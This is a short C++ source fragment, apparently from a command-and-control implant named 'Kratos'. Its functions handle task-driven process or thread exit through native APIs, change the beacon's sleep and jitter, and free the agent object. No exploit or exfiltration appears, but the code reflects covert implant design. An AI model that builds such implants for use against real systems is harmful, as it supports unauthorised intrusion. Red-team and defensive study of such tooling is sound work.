#include "agent/core.h"
#include "packager/packager.h"
#include "modules/modules.h"
#include "net/net.h"

#define AGENT_EXIT_PROCESS 0xf1
#define AGENT_EXIT_THREAD  0xf2
#define EXIT_SUCCESS 0x00000000L

void Kratos::exitAgent() {
	DEBUG_LOG("[!] Agent Shutting down!");
	auto TaskID   = packager->UnPack4( );
	auto ExitType = packager->UnPack4( );


	if ( ExitType == AGENT_EXIT_PROCESS ) {
		
		kratos->apis.RtlExitUserProcess( EXIT_SUCCESS );
	} else if ( ExitType == AGENT_EXIT_THREAD ) {
		auto ExitThread = this->apis.RtlExitUserThread;

		modules->Cleanup( );
		net->Cleanup( );
		packager->Cleanup( );
		this->Cleanup( );
		ExitThread( EXIT_SUCCESS );
	}
	return;
}

void Kratos::Reconfig() {
	auto TaskID    = packager->UnPack4( );
	auto NewSleep  = packager->UnPack4( );
	auto NewJitter = packager->UnPack4( );

	this->settings.Sleep  = NewSleep;
	this->settings.Jitter = NewJitter;

	packager->Pack4( TaskID );
	packager->Pack4( OUTPUT_SUCCESS );
	packager->Pack4( RECONFIG_SUCCESS );
	return;
	
}


void Kratos::Cleanup() {
	auto LocalFree = this->apis.LocalFree;
	Kratos* self = this;
	kratos = NULL;
	LocalFree( self );
}


